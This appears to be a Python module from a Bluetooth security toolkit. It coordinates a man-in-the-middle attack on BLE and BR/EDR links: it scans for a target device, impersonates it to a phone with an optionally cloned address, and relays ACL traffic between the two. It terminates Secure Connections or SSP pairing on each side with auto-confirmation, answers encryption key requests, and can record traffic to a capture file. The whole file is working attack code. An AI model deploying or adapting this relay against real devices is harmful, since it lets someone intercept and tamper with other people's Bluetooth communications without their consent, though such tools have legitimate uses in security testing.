"""MitmRelay —— recon → impersonate → relay 三阶段编排器。

把已有的 MITM 组件(recon/impersonate/AclRelay/ScPairing)装配成一条
"目标 ↔ 中间人 ↔ 手机" 的 BLE 透传链路。

两大部分:

1. UNIT-TESTABLE 核心(本文件被 fake 单测覆盖):
   ``_build_relay`` —— 构造两侧 ScPairing(phone=responder, target=initiator),
   把每个 ScPairing 的 set_output 接到本侧的 SMP-ACL 发送器,返回一个
   smp_handler 会把 CID-0x06 PDU 路由到对应 ScPairing 的 AclRelay。
   这段没有真实控制器也能完整跑通。

2. 结构性 HCI 接线(``run_relay``,硬件验证,非单测):
   等连接完成 → 取 handle + acl_max_payload → _build_relay → 注册 ACL 回调 →
   驱动配对 → 配对完成后用 HCI 在两侧启用加密。需要真实链路,故 best-effort。

HARD RULE:不 import pybluehost.l2cap/.ble/.classic/.gap/.profiles/.stack。
"""
from __future__ import annotations

import asyncio
import logging
from typing import TYPE_CHECKING, Callable, Optional

from pybluehost.cli.app.mitm.acl import CID_SMP, encode_l2cap_basic, fragment
from pybluehost.cli.app.mitm.capture import BtsnoopCaptureTap, NullTap
from pybluehost.cli.app.mitm.pairing.delegate import AutoConfirmDelegate, PairingDelegate
from pybluehost.cli.app.mitm.pairing.smp import ScPairing
from pybluehost.cli.app.mitm.pairing.ssp import SspTermination
from pybluehost.cli.app.mitm.relay import AclRelay, RelaySide
from pybluehost.hci.constants import (
    EventCode,
    HCI_LE_LONG_TERM_KEY_REQUEST_REPLY,
    HCI_LE_START_ENCRYPTION,
    LEMetaSubEvent,
)
from pybluehost.hci.packets import HCI_LE_Meta_Event, HCICommand, HCIEvent

if TYPE_CHECKING:
    from pybluehost.cli.app.mitm.controllers import ControllerPair
    from pybluehost.cli.app.mitm.recon import ClonedIdentity
    from pybluehost.hci.controller import HCIController

logger = logging.getLogger(__name__)


def _addr_str_to_le7(addr: str, addr_type: int) -> bytes:
    """把 "AA:BB:..":addr_type 转成 ScPairing 用的 7 字节 (type || 6 byte LE addr)。"""
    parts = [int(x, 16) for x in addr.split(":")]
    return bytes([addr_type & 0x01]) + bytes(reversed(parts))


class MitmRelay:
    def __init__(
        self,
        pair: "ControllerPair",
        *,
        target_addr: Optional[str] = None,
        target_name: Optional[str] = None,
        btsnoop: Optional[str] = None,
        clone_address: bool = False,
        delegate: Optional[PairingDelegate] = None,
        mode: str = "le",
        numeric: bool = False,
        connect_timeout: float = 30.0,
    ) -> None:
        self._pair = pair
        self._target_addr = target_addr
        self._target_name = target_name
        self._clone_address = clone_address
        self._delegate: PairingDelegate = delegate or AutoConfirmDelegate()
        self._mode = mode  # 'le'|'bredr' — BR 分支 MITM-3 Task 5 接入
        self._numeric = numeric  # BR SSP:True=Numeric Comparison,False=Just Works
        self._capture = BtsnoopCaptureTap(btsnoop) if btsnoop else NullTap()
        self._connect_timeout = connect_timeout

        self._identity: Optional["ClonedIdentity"] = None
        self._relay: Optional[AclRelay] = None
        self._pairings: dict[str, ScPairing] = {}
        self._ssp: dict[str, SspTermination] = {}  # BR/EDR SSP 终结器(每侧一个)
        self._sides: dict[str, RelaySide] = {}
        self._smp_queues: dict[str, asyncio.Queue] = {}
        self._drain_tasks: list[asyncio.Task] = []

    # ------------------------------------------------------------------ recon
    async def run_recon(self) -> None:
        if self._mode == "bredr":
            from pybluehost.cli.app.mitm.bredr_recon import inquiry_for_target
            self._identity = await inquiry_for_target(
                self._pair.upstream,
                target_addr=self._target_addr,
                target_name=self._target_name,
            )
        else:
            from pybluehost.cli.app.mitm.recon import scan_for_target
            self._identity = await scan_for_target(
                self._pair.upstream,
                target_addr=self._target_addr,
                target_name=self._target_name,
            )
        logger.info(
            "recon done: mode=%s target=%s name=%s",
            self._mode, self._identity.address, self._identity.name,
        )

    # ----------------------------------------------------------- impersonate
    async def run_impersonate(self) -> None:
        if self._identity is None:
            raise RuntimeError("run_recon() 必须先于 run_impersonate() 调用")
        if self._mode == "bredr":
            from pybluehost.cli.app.mitm.bredr_impersonate import start_bredr_impersonation
            await start_bredr_impersonation(
                self._pair.downstream,
                self._identity,
                clone_address=self._clone_address,
            )
        else:
            from pybluehost.cli.app.mitm.impersonate import start_impersonation
            await start_impersonation(
                self._pair.downstream,
                self._identity,
                clone_address=self._clone_address,
            )

    # ----------------------------------------------- UNIT-TESTABLE core
    def _build_relay(
        self,
        phone_side: RelaySide,
        target_side: RelaySide,
        phone_local_addr: bytes,
        phone_peer_addr: bytes,
        target_local_addr: bytes,
        target_peer_addr: bytes,
    ) -> AclRelay:
        """装配 SMP↔ScPairing↔ACL 桥接,返回 AclRelay。

        - phone 侧(downstream,面向手机)= responder;
        - target 侧(upstream,面向真实目标)= initiator。
        - 每个 ScPairing 的 set_output 接到本侧的 SMP-ACL 发送器;
        - smp_handler 把某侧收到的 CID-0x06 PDU feed 给同侧 ScPairing。
        """
        self._pairings = {
            "phone": ScPairing(
                role="responder",
                local_addr=phone_local_addr,
                peer_addr=phone_peer_addr,
                delegate=self._delegate,
                side_name="phone",
            ),
            "target": ScPairing(
                role="initiator",
                local_addr=target_local_addr,
                peer_addr=target_peer_addr,
                delegate=self._delegate,
                side_name="target",
            ),
        }
        self._sides = {"phone": phone_side, "target": target_side}

        # C1: 每侧一个队列 + drain task,保证同侧多 PDU 的发送顺序
        self._smp_queues = {name: asyncio.Queue() for name in ("phone", "target")}
        self._drain_tasks = [
            asyncio.ensure_future(self._drain_smp(name)) for name in ("phone", "target")
        ]

        for name in self._pairings:
            self._pairings[name].set_output(self._make_smp_emitter(name))

        async def smp_handler(side_name: str, cid: int, payload: bytes) -> None:
            pairing = self._pairings.get(side_name)
            if pairing is None:
                logger.warning("收到未知侧 %r 的 SMP PDU,丢弃", side_name)
                return
            await pairing.feed(payload)

        self._relay = AclRelay(
            phone_side=phone_side,
            target_side=target_side,
            capture=self._capture,
            smp_handler=smp_handler,
            on_teardown=None,
        )
        return self._relay

    def _make_smp_emitter(self, name: str) -> Callable[[bytes], None]:
        """返回一个 SYNC 回调:把 SMP PDU 入队(保序),由 _drain_smp 串行发出。"""

        def emit(pdu: bytes) -> None:
            self._smp_queues[name].put_nowait(pdu)

        return emit

    async def _drain_smp(self, name: str) -> None:
        """串行消费 SMP 队列,保证同侧多个 PDU 按入队顺序发出。"""
        queue = self._smp_queues[name]
        while True:
            pdu = await queue.get()
            try:
                await self._send_smp(name, pdu)
            except Exception:
                logger.exception("MITM: 发送 %s 侧 SMP PDU 失败", name)
            finally:
                queue.task_done()

    async def _send_smp(self, name: str, pdu: bytes) -> None:
        side = self._sides[name]
        l2 = encode_l2cap_basic(CID_SMP, pdu)
        for frag in fragment(
            handle=side.handle, l2cap_pdu=l2, max_payload=side.acl_max_payload
        ):
            await side.send_acl(frag.handle, frag.pb_flag, frag.data)

    # ------------------------------------------ UNIT-TESTABLE core (BR/EDR)
    def _build_relay_bredr(
        self,
        phone_side: RelaySide,
        target_side: RelaySide,
    ) -> AclRelay:
        """BR/EDR 中继装配(UNIT-TESTABLE 核心)。

        BR 的配对是 Secure Simple Pairing,由控制器在 HCI 事件层完成,
        **不走 L2CAP SMP**。因此:
        - 每侧控制器各挂一个 SspTermination(响应 IO_Capability/User_Confirmation
          /Link_Key 等 HCI 事件);
        - AclRelay 的 smp_handler=None —— BR signaling(CID 0x01)、RFCOMM、SDP
          等动态信道作为普通 L2CAP 透传到对侧,没有需要本地终结的 SMP CID。

        phone 侧对应 downstream 控制器(面向手机),target 侧对应 upstream
        控制器(面向真实目标)。
        """
        downstream = self._pair.downstream
        upstream = self._pair.upstream

        self._ssp = {
            "phone": SspTermination(
                downstream,
                delegate=self._delegate,
                side_name="phone",
                numeric=self._numeric,
            ),
            "target": SspTermination(
                upstream,
                delegate=self._delegate,
                side_name="target",
                numeric=self._numeric,
            ),
        }
        self._ssp["phone"].attach()
        self._ssp["target"].attach()

        self._sides = {"phone": phone_side, "target": target_side}

        self._relay = AclRelay(
            phone_side=phone_side,
            target_side=target_side,
            capture=self._capture,
            smp_handler=None,
            on_teardown=None,
        )
        return self._relay

    # ------------------------------------------------------------------ relay
    async def run_relay(self) -> None:
        """结构性 HCI 接线(硬件验证,非单测)。

        连接/加密路径需要真实链路,故为 best-effort:在没有真实控制器/对端
        的环境里,连接完成事件不会到来,等待会超时。被 fake 单测覆盖的是
        装配核心(LE:_build_relay + SMP 桥接;BR:_build_relay_bredr + SSP 终结),
        这里只是把它接到真实 HCI 事件上。

        LE 与 BR 共享 连接→构建→注册回调 的骨架,差异仅在配对:
        - LE:ScPairing + drain 队列 + LE 加密(LTK/Start_Encryption);
        - BR:SspTermination(控制器事件驱动)+ best-effort 经典加密。
        """
        if self._mode == "bredr":
            await self._run_relay_bredr()
        else:
            await self._run_relay_le()

    async def _run_relay_le(self) -> None:
        upstream = self._pair.upstream
        downstream = self._pair.downstream

        # --- 1. 等两侧连接完成,取 handle ---------------------------------
        # C3: 并发等待,避免串行时错过先到的连接完成事件。
        # downstream 面向手机(手机连上我们的伪装广播);
        # upstream 由本机作为 initiator 连真实目标(发起连接的 HCI 命令属于
        #   连接建立流程,硬件验证;此处只等连接完成事件)。
        target_handle, phone_handle = await asyncio.gather(
            self._await_le_connection(upstream),
            self._await_le_connection(downstream),
        )

        # --- 2. 取每侧的 ACL 最大负载 ------------------------------------
        # 优先 LE buffer 大小,回退到经典 ACL buffer 大小。
        target_max = (
            upstream.le_acl_packet_length or upstream.acl_packet_length or 27
        )
        phone_max = (
            downstream.le_acl_packet_length or downstream.acl_packet_length or 27
        )

        # --- 3. 地址(用于 SMP f5/f6 推导) ------------------------------
        # 真实地址来自连接完成事件/控制器;无法从纯结构层稳妙拿到本机地址,
        # 故此处用占位地址 —— 硬件验证时应替换为真实 A1/A2。
        phone_local = bytes(7)
        phone_peer = bytes(7)
        target_local = bytes(7)
        target_peer = bytes(7)
        if self._identity is not None:
            target_peer = _addr_str_to_le7(
                self._identity.address, self._identity.address_type
            )

        # --- 4. 构造中继(UNIT-TESTABLE 核心) ----------------------------
        phone_side = RelaySide(
            name="phone",
            handle=phone_handle,
            acl_max_payload=phone_max,
            send_acl=downstream.send_acl_data,
        )
        target_side = RelaySide(
            name="target",
            handle=target_handle,
            acl_max_payload=target_max,
            send_acl=upstream.send_acl_data,
        )
        relay = self._build_relay(
            phone_side, target_side,
            phone_local, phone_peer, target_local, target_peer,
        )

        # --- 5. 注册 ACL 回调 --------------------------------------------
        downstream.set_upstream(on_acl_data=relay.on_phone_acl)
        upstream.set_upstream(on_acl_data=relay.on_target_acl)

        # --- 6. 加密接线(best-effort,硬件验证) -------------------------
        # downstream(我们扮 responder):手机发起加密 → LE LTK Request →
        #   我们用 phone 侧 ScPairing 算出的 LTK 回应。
        def _on_phone_ltk_request(handle: int, rand: bytes, ediv: int) -> None:
            ltk = self._pairings["phone"].ltk
            if ltk is None:
                logger.warning("phone LTK 尚未就绪,无法应答 LE_LTK_Request")
                return
            params = handle.to_bytes(2, "little") + ltk
            asyncio.ensure_future(
                downstream.send_command(
                    HCICommand(
                        opcode=HCI_LE_LONG_TERM_KEY_REQUEST_REPLY, parameters=params
                    )
                )
            )

        downstream.on_le_ltk_request(_on_phone_ltk_request)

        # --- 7. 驱动配对:upstream 作 initiator 发起,downstream 等待 -----
        await self._pairings["target"].start()

        # upstream(我们扮 initiator 对真实目标):配对完成后用 LE Start
        # Encryption 启用加密。此处轮询配对完成(best-effort,硬件验证)。
        async def _enable_target_encryption() -> None:
            pairing = self._pairings["target"]
            # 等待 initiator 配对完成,拿到 LTK 后发 LE_Start_Encryption。
            for _ in range(2000):  # ~20s 上限,避免无限等待
                if pairing.is_complete() and pairing.ltk is not None:
                    break
                await asyncio.sleep(0.01)
            if not pairing.is_complete() or pairing.ltk is None:
                logger.warning("target 侧配对未完成,跳过 LE_Start_Encryption")
                return
            # LE_Start_Encryption: handle(2) || rand(8) || ediv(2) || ltk(16)
            params = (
                target_handle.to_bytes(2, "little")
                + bytes(8)  # rand = 0 (SC)
                + bytes(2)  # ediv = 0 (SC)
                + pairing.ltk
            )
            await upstream.send_command(
                HCICommand(opcode=HCI_LE_START_ENCRYPTION, parameters=params)
            )

        await _enable_target_encryption()

    async def _run_relay_bredr(self) -> None:
        """BR/EDR 中继(结构性 HCI 接线,硬件验证,非单测)。

        与 LE 路径共享 连接→构建→注册回调 骨架,差异在配对/加密:
        - 等两侧 *经典* 连接完成(EventCode.CONNECTION_COMPLETE 0x03,
          而非 LE Meta);
        - 用 _build_relay_bredr 装配(SspTermination 已在其内挂到两侧控制器);
        - SSP 由 SspTermination 在 HCI 事件层自动完成,无 ScPairing、无 drain 队列;
        - 加密(HCI Authentication_Requested / Set_Connection_Encryption)
          为 best-effort,经典链路加密通常随 SSP 自动建立,这里不强制下发,
          留待硬件验证(结构性,注释清晰)。
        """
        upstream = self._pair.upstream
        downstream = self._pair.downstream

        # --- 1. 等两侧经典连接完成,取 handle ----------------------------
        target_handle, phone_handle = await asyncio.gather(
            self._await_bredr_connection(upstream),
            self._await_bredr_connection(downstream),
        )

        # --- 2. 取每侧的 ACL 最大负载(经典 ACL buffer) -----------------
        target_max = upstream.acl_packet_length or 27
        phone_max = downstream.acl_packet_length or 27

        # --- 3. 构造中继(UNIT-TESTABLE 核心) ---------------------------
        phone_side = RelaySide(
            name="phone",
            handle=phone_handle,
            acl_max_payload=phone_max,
            send_acl=downstream.send_acl_data,
        )
        target_side = RelaySide(
            name="target",
            handle=target_handle,
            acl_max_payload=target_max,
            send_acl=upstream.send_acl_data,
        )
        relay = self._build_relay_bredr(phone_side, target_side)

        # --- 4. 注册 ACL 回调 -------------------------------------------
        downstream.set_upstream(on_acl_data=relay.on_phone_acl)
        upstream.set_upstream(on_acl_data=relay.on_target_acl)

        # --- 5. SSP + 加密(事件驱动 / best-effort,硬件验证) -----------
        # SspTermination 已 attach,IO_Capability/User_Confirmation/Link_Key
        # 等事件到来时自动应答。经典链路加密随 SSP 自动协商,这里不再显式
        # 下发 Set_Connection_Encryption(结构性,留待硬件验证)。

    async def _await_bredr_connection(self, controller: "HCIController") -> int:
        """等待一个经典 Connection_Complete 事件(0x03),返回 connection handle。

        best-effort:无真实硬件时事件不会到来。复用 controller 的 on_hci_event
        链(暂存并恢复全部三个上游回调)。Connection_Complete 布局:
        status(1) handle(2 LE) bd_addr(6) link_type(1) encryption_mode(1)。
        """
        loop = asyncio.get_running_loop()
        fut: asyncio.Future[int] = loop.create_future()
        prev_hci = controller._on_hci_event   # type: ignore[attr-defined]
        prev_acl = controller._on_acl_data    # type: ignore[attr-defined]
        prev_sco = controller._on_sco_data    # type: ignore[attr-defined]

        def on_event(event: HCIEvent) -> None:
            if event.event_code == EventCode.CONNECTION_COMPLETE:
                params = getattr(event, "parameters", b"") or b""
                # status(1) handle(2) ...
                if len(params) >= 3 and params[0] == 0x00 and not fut.done():
                    handle = int.from_bytes(params[1:3], "little")
                    fut.set_result(handle)
                    return
            if prev_hci is not None:
                result = prev_hci(event)
                if asyncio.iscoroutine(result):
                    asyncio.ensure_future(result)

        controller.set_upstream(on_hci_event=on_event)
        try:
            return await asyncio.wait_for(fut, timeout=self._connect_timeout)
        finally:
            controller.set_upstream(
                on_hci_event=prev_hci,
                on_acl_data=prev_acl,
                on_sco_data=prev_sco,
            )

    async def _await_le_connection(self, controller: "HCIController") -> int:
        """等待一个 LE_Connection_Complete / Enhanced 子事件,返回 connection handle。

        best-effort:在没有真实硬件时没有事件会到来。复用 controller 的
        on_hci_event 链(暂存并恢复前序回调,避免吞掉其它事件)。

        C2: 保存并恢复全部三个上游回调(on_hci_event/on_acl_data/on_sco_data)。
        I1: 带超时,TimeoutError 仍会触发 finally 恢复回调。
        I4: 使用 get_running_loop() 代替 get_event_loop()。
        """
        loop = asyncio.get_running_loop()  # I4
        fut: asyncio.Future[int] = loop.create_future()
        # C2: 保存全部三个回调
        prev_hci = controller._on_hci_event   # type: ignore[attr-defined]
        prev_acl = controller._on_acl_data    # type: ignore[attr-defined]
        prev_sco = controller._on_sco_data    # type: ignore[attr-defined]

        def on_event(event: HCIEvent) -> None:
            if isinstance(event, HCI_LE_Meta_Event) and event.subevent_code in (
                LEMetaSubEvent.LE_CONNECTION_COMPLETE,
                LEMetaSubEvent.LE_ENHANCED_CONNECTION_COMPLETE,
            ):
                params = event.subevent_parameters
                # subevent: status(1) handle(2) role(1) ...
                if len(params) >= 3 and params[0] == 0x00 and not fut.done():
                    handle = int.from_bytes(params[1:3], "little")
                    fut.set_result(handle)
            if prev_hci is not None:
                result = prev_hci(event)
                if asyncio.iscoroutine(result):
                    asyncio.ensure_future(result)

        controller.set_upstream(on_hci_event=on_event)
        try:
            return await asyncio.wait_for(fut, timeout=self._connect_timeout)  # I1
        finally:
            # C2: 恢复全部三个回调
            controller.set_upstream(
                on_hci_event=prev_hci,
                on_acl_data=prev_acl,
                on_sco_data=prev_sco,
            )

    # --------------------------------------------------------------- teardown
    async def teardown(self) -> None:
        # I2: 先取消 drain tasks,再拆 relay,再关 capture 和 pair
        for t in self._drain_tasks:
            t.cancel()
        if self._relay is not None:
            try:
                await self._relay.teardown()
            except Exception:
                logger.exception("MITM: relay teardown 失败")
        # I2: 无论 relay 是否存在都关闭 capture(双关安全)
        try:
            await self._capture.close()
        except Exception:
            logger.exception("MITM: capture close 失败")
        try:
            await self._pair.close()
        except Exception:
            logger.exception("MITM: pair close 失败")
